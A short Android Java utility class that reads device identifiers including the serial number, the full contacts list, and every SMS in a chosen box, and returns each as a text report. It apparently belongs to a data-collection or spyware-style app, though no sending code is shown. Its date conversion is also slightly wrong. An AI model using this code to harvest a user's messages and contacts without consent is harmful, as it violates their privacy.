
package com.google.myapplication;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;

import java.util.Date;

public class Functions {

    @SuppressLint("Range")
    public static String deviceInfo() {
        String manufacturer = android.os.Build.MANUFACTURER;
        String model = android.os.Build.MODEL;
        String version = android.os.Build.VERSION.RELEASE;
        String product = android.os.Build.PRODUCT;
        String serial = android.os.Build.SERIAL; // Requires `READ_PHONE_STATE` permission for API level 26+

        return "Manufacturer: " + manufacturer + "\n" +
                "Model: " + model + "\n" +
                "Version: " + version + "\n" +
                "Product: " + product + "\n" +
                "Serial: " + serial + "\n";
    }
    //for get contact function
    public static String getContacts(ContentResolver contentResolver) {
        StringBuilder contacts = new StringBuilder("Contacts: \n");
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            do {
                @SuppressLint("Range") String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                contacts.append("ID: ").append(id).append(", Name: ").append(name).append("\n");
            } while (cursor.moveToNext());
            cursor.close();
        }
        return contacts.toString();
    }
    public static class readSMS {
        Context context;

        public readSMS(Context context){
            this.context = context;
        }

        // for get sms access
        public String readSMSBox(String box) {
            Uri SMSURI = Uri.parse("content://sms/"+box);
            Cursor cur = context.getContentResolver().query(SMSURI, null, null, null,null);
            String sms = "";
            try {
                if (cur.moveToFirst()) {
                    for (int i = 0; i < cur.getCount(); ++i) {
                        String iterator = String.valueOf(i);
                        String number = cur.getString(cur.getColumnIndexOrThrow("address"));
                        String date = cur.getString(cur.getColumnIndexOrThrow("date"));
                        String person = cur.getString(cur.getColumnIndexOrThrow("person"));
                        Long epoch = Long.parseLong(date);
                        Date fDate = new Date(epoch * 1000);
                        date = fDate.toString();
                        String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                        String fi = "#"+iterator+"\n"+"Number : "+number+"\n"+"Person : "+person+"\n"+"Date : "+fDate+"\n"+"Body : "+body+"\n";
                        sms+=fi+"\n";
                        //sms += "[" + number + ":" + date + "]" + body + "\n";
                        cur.moveToNext();
                    }
                    sms += "\n";
                }
            } catch(NullPointerException npe) {
                return "";
            }
            return sms;
        }

    }

    // Implement other functions like callLog() and getSms() similarly
}